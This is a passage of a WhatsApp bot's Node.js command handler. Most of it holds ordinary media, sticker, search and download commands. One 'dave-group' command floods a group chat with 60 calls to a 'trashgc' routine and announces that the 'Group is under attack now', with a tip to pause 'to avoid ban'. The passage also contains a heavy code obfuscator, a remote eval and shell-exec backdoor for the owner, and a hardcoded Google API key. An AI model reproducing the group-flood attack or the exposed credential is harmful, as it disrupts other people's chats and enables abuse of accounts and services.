        return reply('❌ Please Reply File To Be Encryption.');
    }
    try {
        const fileName = quotedDocument.fileName;
        const docBuffer = await m.quoted.download();
        if (!docBuffer) {
            return reply('❌ Please Reply File To Be Encryption.');
        }
        await dave.sendMessage(m.chat, {
            react: { text: '🕛', key: m.key }
        });
        const obfuscatedCode = await JsConfuser.obfuscate(docBuffer.toString(), {
            target: "node",
            preset: "high",
            compact: true,
            minify: true,
            flatten: true,
            identifierGenerator: function () {
                const originalString = "素GIFTED晴DAVE晴" + "素GIFTED晴DAVE晴";
                const removeUnwantedChars = (input) => input.replace(/[^a-zA-Z素GIDDY晴TENNOR晴]/g, "");
                const randomString = (length) => {
                    let result = "";
                    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
                    for (let i = 0; i < length; i++) {
                        result += characters.charAt(Math.floor(Math.random() * characters.length));
                    }
                    return result;
                };
                return removeUnwantedChars(originalString) + randomString(2);
            },
            renameVariables: true,
            renameGlobals: true,
            stringEncoding: true,
            stringSplitting: 0.0,
            stringConcealing: true,
            stringCompression: true,
            duplicateLiteralsRemoval: 1.0,
            shuffle: { hash: 0.0, true: 0.0 },
            stack: true,
            controlFlowFlattening: 1.0,
            opaquePredicates: 0.9,
            deadCode: 0.0,
            dispatcher: true,
            rgf: false,
            calculator: true,
            hexadecimalNumbers: true,
            movedDeclarations: true,
            objectExtraction: true,
            globalConcealing: true,
        });
        await dave.sendMessage(m.chat, {
            document: Buffer.from(obfuscatedCode, 'utf-8'),
            mimetype: 'application/javascript',
            fileName: `${fileName}`,
            caption: `•Successful Encrypt\n•Type: Hard Code\n•@giftde dave`,
        }, { quoted: fkontak });

    } catch (err) {
        console.error('Error during encryption:', err);
        await reply(`❌ An error occurred: ${error.message}`);
    }
}
break

case 'tomp3': 
case 'tovn':
case 'toaudio': {
  try {
    const { downloadContentFromMessage } = require('@whiskeysockets/baileys');
    const ffmpeg = require('fluent-ffmpeg');
    const fs = require('fs');
    const { tmpdir } = require('os');
    const path = require('path');

    // ✅ Get the media message
    const quotedMsg = m.message?.extendedTextMessage?.contextInfo?.quotedMessage;
    const msg = (quotedMsg && (quotedMsg.videoMessage || quotedMsg.audioMessage)) 
                || m.message?.videoMessage 
                || m.message?.audioMessage;

    if (!msg) return reply("🎧 Reply to a *video* or *audio* to convert it to audio!");

    const mime = msg.mimetype || '';
    if (!/video|audio/.test(mime)) return reply("⚠️ Only works on *video* or *audio* messages!");

    reply("🎶 Converting to audio...");

    // ✅ Download media
    const stream = await downloadContentFromMessage(msg, mime.split("/")[0]);
    let buffer = Buffer.from([]);
    for await (const chunk of stream) buffer = Buffer.concat([buffer, chunk]);

    // ✅ Temp paths
    const inputPath = path.join(tmpdir(), `input_${Date.now()}.mp4`);
    const outputPath = path.join(tmpdir(), `output_${Date.now()}.mp3`);
    fs.writeFileSync(inputPath, buffer);

    // ✅ Convert using ffmpeg
    await new Promise((resolve, reject) => {
      ffmpeg(inputPath)
        .toFormat('mp3')
        .on('end', resolve)
        .on('error', reject)
        .save(outputPath);
    });

    // ✅ Send converted audio
    const audioBuffer = fs.readFileSync(outputPath);
    await dave.sendMessage(from, { audio: audioBuffer, mimetype: 'audio/mpeg', ptt: false }, { quoted: m });

    // ✅ Cleanup
    fs.unlinkSync(inputPath);
    fs.unlinkSync(outputPath);

    reply("✅ Conversion complete!");
  } catch (err) {
    console.error("❌ toaudio error:", err);
    reply("💥 Failed to convert media to audio. Ensure it's a valid video/audio file.");
  }
}
break;

case 'readmore':
case 'readall': {
  if (!q) return reply(`Enter text like ${command} youarebad|justkidding`)
  let [l, r] = text.split`|`
  if (!l) l = ''
  if (!r) r = ''
  reply(l + readmore + r)
}
break;

case 'stickerwm':
case 'wm':
case 'stikerwm':
case 'swm': {
  if (!text) return reply('Enter watermark text!')
  if (!/image|video/gi.test(mime)) return m.reply('Send media first')
  if (/video/gi.test(mime) && qmsg.seconds > 15)
    return m.reply('Video duration must be less than 15 seconds!')
  var image = await dave.downloadAndSaveMediaMessage(qmsg)
  await dave.sendImageAsSticker(m.chat, image, m, { packname: text })
  await fs.unlinkSync(image)
  dave.sendMessage(m.chat, { react: { text: '✅', key: m.key } })
}
break;

case 'stiker':
case 'tosticker': {
    try {
        let msgMedia = quoted ? quoted : m;
        let type = Object.keys(msgMedia.message)[0];

        if (!/image|video/gi.test(type)) return reply('❌ Send or reply to media first!');

        // For video, check duration
        if (type === 'videoMessage') {
            const duration = msgMedia.message.videoMessage.seconds || 0;
            if (duration > 15) return reply('❌ Video duration must be less than 15 seconds!');
        }

        // Download media
        const media = await dave.downloadAndSaveMediaMessage(msgMedia);

        // Send sticker
        await dave.sendImageAsSticker(m.chat, media, m, { packname: footer });

        // Delete temp file
        fs.unlinkSync(media);

        // React
        await dave.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
    } catch (err) {
        console.error(err);
        reply('❌ An error occurred while creating the sticker.');
    }
}
break;

case 'smeme':
case 'stickermeme':
case 'stickmeme': {
  await dave.sendMessage(m.chat, { react: { text: '🚀', key: m.key } })
  if (!/webp/.test(mime) && /image/.test(mime)) {
    if (!text) return m.reply(`Usage: ${prefix + command} text1|text2`)
    let atas = text.split('|')[0] ? text.split('|')[0] : '-'
    let bawah = text.split('|')[1] ? text.split('|')[1] : '-'
    let mee = await dave.downloadAndSaveMediaMessage(quoted)
    let mem = await UploadFileUgu(mee)
    let meme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${mem.url}`
    await dave.sendImageAsSticker(m.chat, meme, m, {
      packname: global.packname,
      author: global.author
    })
  } else {
    m.reply(`Send/Reply an image with caption ${prefix + command} text1|text2`)
  }
}
break;

//=================== 📸 MEDIA UPLOADERS ====

case 'hdvideo':
case 'hdvid': {
  const ffmpeg = require('fluent-ffmpeg')
  const ffmpegStatic = require('ffmpeg-static')
  const { writeFile, unlink, mkdir } = require('fs').promises
  const { existsSync } = require('fs')
  const path = require('path')

  if (!ffmpegStatic) {
    return dave.sendMessage(m.chat, { text: '❌ FFMPEG not found!' }, { quoted: m })
  }
  ffmpeg.setFfmpegPath(ffmpegStatic)
  let inputPath, outputPath
  try {
    let q = m.quoted || m
    let mime = q.mimetype || q.msg?.mimetype || q.mediaType || ''
    if (!mime) return dave.sendMessage(m.chat, { text: 'Where is the video?' }, { quoted: m })
    if (!/video\/(mp4|mov|avi|mkv)/.test(mime)) {
      return dave.sendMessage(m.chat, { text: `❌ Format ${mime} not supported!` }, { quoted: m })
    }
    dave.sendMessage(m.chat, { text: '⏳ Processing video, please wait 2-4 minutes...' }, { quoted: m })
    let videoBuffer = await q.download?.()
    if (!videoBuffer) return dave.sendMessage(m.chat, { text: '❌ Failed to download video!' }, { quoted: m })
    let tempDir = path.join(__dirname, 'tmp')
    if (!existsSync(tempDir)) await mkdir(tempDir, { recursive: true })
    inputPath = path.join(tempDir, `input_${Date.now()}.mp4`)
    outputPath = path.join(tempDir, `output_${Date.now()}.mp4`)
    await writeFile(inputPath, videoBuffer)
    await new Promise((resolve, reject) => {
      ffmpeg(inputPath)
        .outputOptions([
          '-vf', 'scale=iw*1.5:ih*1.5:flags=lanczos,eq=contrast=1:saturation=1.7,hqdn3d=1.5:1.5:6:6,unsharp=5:5:0.8:5:5:0.8',
          '-r', '60',
          '-preset', 'faster',
          '-crf', '25',
          '-c:v', 'libx264',
          '-pix_fmt', 'yuv420p',
          '-c:a', 'aac',
          '-b:a', '128k'
        ])
        .on('end', resolve)
        .on('error', reject)
        .save(outputPath)
    })
    await dave.sendMessage(m.chat, {
      video: { url: outputPath },
      caption: 'Video quality enhanced successfully!'
    }, { quoted: m })
  } catch (err) {
    console.error('Error HD Video:', err)
    dave.sendMessage(m.chat, { text: 'Failed to enhance video quality.' }, { quoted: m })
  } finally {
    setTimeout(() => {
      if (inputPath) unlink(inputPath).catch(() => {})
      if (outputPath) unlink(outputPath).catch(() => {})
    }, 5000)
  }
}
break;

case 'hd':
case 'tohd':
case 'remini': {
  if (!quoted) return reply('Where is the photo?')
  if (!/image/.test(mime)) return reply(`Send/Reply to a photo with caption ${prefix + command}`)
  await dave.sendMessage(m.chat, { react: { text: '⏱️', key: m.key } })

  await reply('Please wait, your process has started...\n\n⏳ This may take some time, please be patient.')

  let cap = `*Type:* SuperHD\n*Result:* Success`
  let media = await dave.downloadAndSaveMediaMessage(quoted)
  try {
    let catBoxUrl = await CatBox(media)
    let anjai = await fetchJson(`https://api.vreden.my.id/api/artificial/hdr?url=${catBoxUrl}&pixel=4`)
    let result = anjai.result.data.downloadUrls[0]
    dave.sendMessage(m.chat, { image: { url: result }, caption: cap }, { quoted: m })
  } catch (error) {
    console.error(error)
    reply('❌ Error processing HD image.')
  }
}
break;

case "tourl3": { 
  if (!m.quoted) return reply("❌ Reply to the image with /tourlpub");
  let q = await m.quoted.download();
  if (!q) return reply("❌ Failed to download");
  const FormData = require("form-data"),
    axios = require("axios"),
    form = new FormData();
  form.append("key", "LutBotz.Tamvan.dan.ganteng.banget.sumpah");
  form.append("file", q, { filename: "wa.png", contentType: "image/png" });
  const r = await axios.post("https://rismajaya.my.id/tools/uploaders/uploads.php", form, { headers: form.getHeaders() });
  const d = r.data;
  if (!d.success) return reply("❌ " + d.error);
  await reply(`𝘿𝙖𝙫𝙚𝘼𝙄 urls\n\n${d.url}`);
}
break;

// 🔍 Anime Search
case 'animesearch': {
    if (!text) return reply(`Example usage: ${prefix + command} Solo Leveling`);
    try {
        reply('🔍 Searching for anime...');
        const apiUrl = `https://flowfalcon.dpdns.org/anime/search?q=${encodeURIComponent(text)}`;
        const { data } = await axios.get(apiUrl);
        if (!data?.status || !data.result || data.result.length === 0) {
            return reply('❌ No results found for that anime.');
        }
        let replyText = `🎌 *Anime Search Results* 🎌\n\n`;
        data.result.forEach((anime, index) => {
            replyText += `*${index + 1}. ${anime.title}*\n`;
            replyText += `├ Type: ${anime.type || 'Unknown'}\n`;
            replyText += `├ Status: ${anime.status || 'Unknown'}\n`;
            replyText += `└ Link: ${anime.link || 'N/A'}\n\n`;
        });
        const firstResult = data.result[0];
        await dave.sendMessage(m.chat, { image: { url: firstResult.image || '' }, caption: replyText }, { quoted: m });
    } catch (err) {
        console.error(err);
        reply('❌ Failed to search for anime. Try again later.');
    }
}
break;

// 🛒 Play Store Search
case 'playstore':
case 'pstore': {
    if (!text) return reply(`Example: ${prefix + command} WhatsApp`);
    try {
        let response = await fetchJson(`https://api.vreden.web.id/api/playstore?query=${encodeURIComponent(text)}`);
        let results = response.result || [];
        if (!results.length) return reply('❌ No results found.');
        let image = results[0]?.img || '';
        let textResult = results.map((item, i) => {
            return `*${i + 1}. ${item.title.toUpperCase()}*\nDeveloper: ${item.developer || 'N/A'}\nRating: ${item.rate2 || 'N/A'}\nLink: ${item.link || 'N/A'}\nDeveloper Link: ${item.link_dev || 'N/A'}`;
        }).join('\n\n');
        await dave.sendMessage(m.chat, { image: { url: image }, caption: textResult }, { quoted: m });
    } catch (err) {
        console.error(err);
        reply('❌ Error fetching Play Store results.');
    }
}
break;

// 🎮 PlayStation Search
case 'playstation':
case 'pstation': {
    if (!text) return reply(`Example: ${prefix + command} Naruto`);
    try {
        let response = await fetchJson(`https://fastrestapis.fasturl.cloud/search/playstation?query=${encodeURIComponent(text)}`);
        let results = response.result || [];
        if (!results.length) return reply('❌ No results found.');
        let image = results[0]?.images || '';
        let textResult = results.map((item, i) => `*${i + 1}. ${item.title.toUpperCase()}*\nLink: ${item.link || 'N/A'}`).join('\n\n');
        await dave.sendMessage(m.chat, { image: { url: image }, caption: textResult }, { quoted: m });
    } catch (err) {
        console.error(err);
        reply('Error fetching PlayStation results.');
    }
}
break;

// 🌐 Google Search
case 'google': {
    if (!text) return reply(`Example: ${prefix + command} Dave`);
    try {
        const apiKey = 'AIzaSyAajE2Y-Kgl8bjPyFvHQ-PgRUSMWgBEsSk';
        const cx = 'e5c2be9c3f94c4bbb';
        const url = `https://www.googleapis.com/customsearch/v1?q=${encodeURIComponent(text)}&key=${apiKey}&cx=${cx}`;
        const res = await fetch(url);
        const data = await res.json();
        if (!data.items || !data.items.length) return reply('❌ No results found.');
        let textResult = `🔎 *Google Search Results for:* ${text}\n\n`;
        data.items.forEach(item => {
            textResult += `• *Title:* ${item.title || 'N/A'}\n`;
            textResult += `• *Description:* ${item.snippet || 'N/A'}\n`;
            textResult += `• *Link:* ${item.link || 'N/A'}\n\n`;
        });
        reply(textResult);
    } catch (err) {
        console.error(err);
        reply('Error performing Google search.');
    }
}
break;

case 'ytmp4': {
  const axios = require('axios');
  const input = text?.trim();
  if (!input) return reply(`play:\n.ytmp4 https://youtu.be/xxxx,720\n\nList for results:\n- 360\n- 480\n- 720\n- 1080`);
  const [url, q = '720'] = input.split(',').map(a => a.trim());
  const validUrl = /^(https?:\/\/)?(www\.)?(youtube\.com|youtu\.be)\//.test(url);
  if (!validUrl) return reply(`❌ URL YouTube is not valid!`);
  const qualityMap = {
    "360": 360,
    "480": 480,
    "720": 720,
    "1080": 1080
  };
  if (!qualityMap[q]) {
    return reply(`❌ Quality must be valid!\nexample: 360, 720, 1080`);
  }
  const quality = qualityMap[q];
  const sendResult = async (meta) => {
    await dave.sendMessage(m.chat, {
      image: { url: meta.image },
      caption: `✅ *Title:* ${meta.title}\n📥 *Type:* MP4\n🎚️ *Quality:* ${meta.quality}p\n\nSending  file...`,
    }, { quoted: m });
    await dave.sendMessage(m.chat, {
      document: { url: meta.downloadUrl },
      mimetype: 'video/mp4',
      fileName: `${meta.title}.mp4`
    }, { quoted: m });
  };
  try {
    const { data: start } = await axios.get(
      `https://p.oceansaver.in/ajax/download.php?button=1&start=1&end=1&format=${quality}&iframe_source=https://allinonetools.com/&url=${encodeURIComponent(url)}`,
      {
        timeout: 30000,
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
        }
      }
    );
    if (!start.progress_url) return m.reply(`❌ failed to start progress`);
    let progressUrl = start.progress_url;
    let meta = {
      image: start.info?.image || "https://telegra.ph/file/fd0028db8c3fc25d85726.jpg",
      title: start.info?.title || "Unknown Title",
      downloadUrl: "",
      quality: q,
      type: "mp4"
    };
    let polling, attempts = 0;
    const maxTry = 40;
    reply('⏳ processing video...');
    do {
      if (attempts >= maxTry) return reply(`❌ Timeout process!`);
      await new Promise(r => setTimeout(r, 3000));
      try {
        const { data } = await axios.get(progressUrl, {
          timeout: 15000,
          headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
          }
        });
        polling = data;
        if (polling.progress < 100) console.log(`Progress: ${polling.progress}%`);
      } catch (e) {
        console.log(`Polling ${attempts + 1} gagal`);
      }
      attempts++;
    } while (!polling?.download_url);
    if (!polling.download_url) return reply(`❌ failed to get download from the link`);
    meta.downloadUrl = polling.download_url;
    return await sendResult(meta);
  } catch (e) {
    console.error(e);
    return reply(`❌ error has occurred: ${e.message || 'err'}`);
  }
}
break;

case 'dave-group': {
    if (!daveshown) return reply("This Feature Only Send By Bot Number");
    if (!m.isGroup) return reply(mess.group)
    dave.sendMessage(m.chat, { react: { text: '🆘', key: m.key } });
    for (let r = 0; r < 15; r++) {
        await trashgc(m.chat);
        await trashgc(m.chat);
        await trashgc(m.chat);
        await trashgc(m.chat);
    }
    await sleep(1000)
    console.log(chalk.red.bold("Success!"))
    reply(`[ 🔥 ] Group is under attack now
 _*\`Status\`*_ : *SUCCESS  ATTACK 鉁�*
 _*\`Type\`*_ : _${command}_
> pause for five-ten minutes to avoid ban
`)   
}
break;

case 'cry': case 'kill': case 'hug': case 'pat': case 'lick': 
case 'kiss': case 'bite': case 'yeet': case 'bully': case 'bonk':
case 'wink': case 'poke': case 'nom': case 'slap': case 'smile': 
case 'wave': case 'awoo': case 'blush': case 'smug': case 'glomp': 
case 'happy': case 'dance': case 'cringe': case 'cuddle': case 'highfive': 
case 'shinobu': case 'handhold': {
    axios.get(`https://api.waifu.pics/sfw/${command}`)
    .then(({data}) => {
        dave.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
    })
}
break;

case 'woof':
case '8ball':
case 'goose':
case 'gecg':
case 'feed':
case 'avatar':
case 'fox_girl':
case 'lizard':
case 'spank':
case 'meow':
case 'tickle':{
    axios.get(`https://nekos.life/api/v2/img/${command}`)
    .then(({data}) => {
        dave.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
    })
}
break;

case 'glitchtext':
case 'writetext':
case 'advancedglow':
case 'typographytext':
case 'pixelglitch':
case 'neonglitch':
case 'flagtext':
case 'flag3dtext':
case 'deletingtext':
case 'blackpinkstyle':
case 'glowingtext':
case 'underwatertext':
case 'logomaker':
case 'cartoonstyle':
case 'papercutstyle':
case 'watercolortext':
case 'effectclouds':
case 'blackpinklogo':
case 'gradienttext':
case 'summerbeach':
case 'luxurygold':
case 'multicoloredneon':
case 'sandsummer':
case 'galaxywallpaper':
case '1917style':
case 'makingneon':
case 'royaltext':
case 'freecreate':
case 'galaxystyle':
case 'lighteffects':{
    if (!q) return reply(`Example : ${prefix+command} Trash corr`) 
    let link
    if (/glitchtext/.test(command)) link = 'https://en.ephoto360.com/create-digital-glitch-text-effects-online-767.html'
    if (/writetext/.test(command)) link = 'https://en.ephoto360.com/write-text-on-wet-glass-online-589.html'
    if (/advancedglow/.test(command)) link = 'https://en.ephoto360.com/advanced-glow-effects-74.html'
    if (/typographytext/.test(command)) link = 'https://en.ephoto360.com/create-typography-text-effect-on-pavement-online-774.html'
    if (/pixelglitch/.test(command)) link = 'https://en.ephoto360.com/create-pixel-glitch-text-effect-online-769.html'
    if (/neonglitch/.test(command)) link = 'https://en.ephoto360.com/create-impressive-neon-glitch-text-effects-online-768.html'
    if (/flagtext/.test(command)) link = 'https://en.ephoto360.com/nigeria-3d-flag-text-effect-online-free-753.html'
    if (/flag3dtext/.test(command)) link = 'https://en.ephoto360.com/free-online-american-flag-3d-text-effect-generator-725.html'
    if (/deletingtext/.test(command)) link = 'https://en.ephoto360.com/create-eraser-deleting-text-effect-online-717.html'
    if (/blackpinkstyle/.test(command)) link = 'https://en.ephoto360.com/online-blackpink-style-logo-maker-effect-711.html'
    if (/glowingtext/.test(command)) link = 'https://en.ephoto360.com/create-glowing-text-effects-online-706.html'
    if (/underwatertext/.test(command)) link = 'https://en.ephoto360.com/3d-underwater-text-effect-online-682.html'
    if (/logomaker/.test(command)) link = 'https://en.ephoto360.com/free-bear-logo-maker-online-673.html'
    if (/cartoonstyle/.test(command)) link = 'https://en.ephoto360.com/create-a-cartoon-style-graffiti-text-effect-online-668.html'
    if (/papercutstyle/.test(command)) link = 'https://en.ephoto360.com/multicolor-3d-paper-cut-style-text-effect-658.html'
    if (/watercolortext/.test(command)) link = 'https://en.ephoto360.com/create-a-watercolor-text-effect-online-655.html'
    if (/effectclouds/.test(command)) link = 'https://en.ephoto360.com/write-text-effect-clouds-in-the-sky-online-619.html'
    if (/blackpinklogo/.test(command)) link = 'https://en.ephoto360.com/create-blackpink-logo-online-free-607.html'
    if (/gradienttext/.test(command)) link = 'https://en.ephoto360.com/create-3d-gradient-text-effect-online-600.html'
    if (/summerbeach/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-free-595.html'
    if (/luxurygold/.test(command)) link = 'https://en.ephoto360.com/create-a-luxury-gold-text-effect-online-594.html'
    if (/multicoloredneon/.test(command)) link = 'https://en.ephoto360.com/create-multicolored-neon-light-signatures-591.html'
    if (/sandsummer/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-576.html'
    if (/galaxywallpaper/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-wallpaper-mobile-online-528.html'
    if (/1917style/.test(command)) link = 'https://en.ephoto360.com/1917-style-text-effect-523.html'
    if (/makingneon/.test(command)) link = 'https://en.ephoto360.com/making-neon-light-text-effect-with-galaxy-style-521.html'
    if (/royaltext/.test(command)) link = 'https://en.ephoto360.com/royal-text-effect-online-free-471.html'
    if (/freecreate/.test(command)) link = 'https://en.ephoto360.com/free-create-a-3d-hologram-text-effect-441.html'
    if (/galaxystyle/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-style-free-name-logo-438.html'
    if (/lighteffects/.test(command)) link = 'https://en.ephoto360.com/create-light-effects-green-neon-online-429.html'
    let haldwhd = await ephoto(link, q)
    dave.sendMessage(m.chat, { image: { url: haldwhd }, caption: `${mess.success}` }, { quoted: m })
}
break;

case 'truth': {
    const truth = [
        "Have you ever liked anyone? How long?",
        "If you can or if you want, which gc/outside gc would you make friends with?",
        // ... rest of your truth questions
    ]
    const xeontruth = truth[Math.floor(Math.random() * truth.length)]
    buffertruth = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
    dave.sendMessage(from, { image: buffertruth, caption: '_You choose TRUTH_\n'+ xeontruth }, {quoted:m})
}
break;

case 'dare': {
    const dare = [
        "eat 2 tablespoons of rice without any side dishes",
        "spill people who make you pause",
        // ... rest of your dare challenges
    ]
    const xeondare = dare[Math.floor(Math.random() * dare.length)]
    bufferdare = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
    dave.sendMessage(from, { image: bufferdare, caption: '_You choose DARE_\n'+ xeondare }, {quoted:m})
}
break;

default:
if (budy.startsWith('=>')) {
if (!daveshown) return
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)
}
return reply(bang)
}
try {
reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
reply(String(e))
}
}

if (budy.startsWith('>')) {
if (!daveshown) return
let kode = budy.trim().split(/ +/)[0]
let teks
try {
teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
} catch (e) {
teks = e
} finally {
await reply(require('util').format(teks))
}
}

if (budy.startsWith('$')) {
if (!daveshown) return
exec(budy.slice(2), (err, stdout) => {
if (err) return reply(`${err}`)
if (stdout) return reply(stdout)
})
}
}

} catch (err) {
  let error = err.stack || err.message || util.format(err);
  console.log('====== ERROR REPORT ======');
  console.log(error);
  console.log('==========================');

  await dave.sendMessage(`${error}@s.whatsapp.net`, {
    text: `⚠️ *ERROR!*\n\n📌 *Message:* ${err.message || '-'}\n📂 *Stack Trace:*\n${error}`,
    contextInfo: { forwardingScore: 9999999, isForwarded: true }
  }, { quoted: m });
}
}
//━━━━━━━━━━━━━━━━━━━━━━━━//
// File Update
let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(`Update File 📁 : ${__filename}`)
delete require.cache[file]
require(file)
})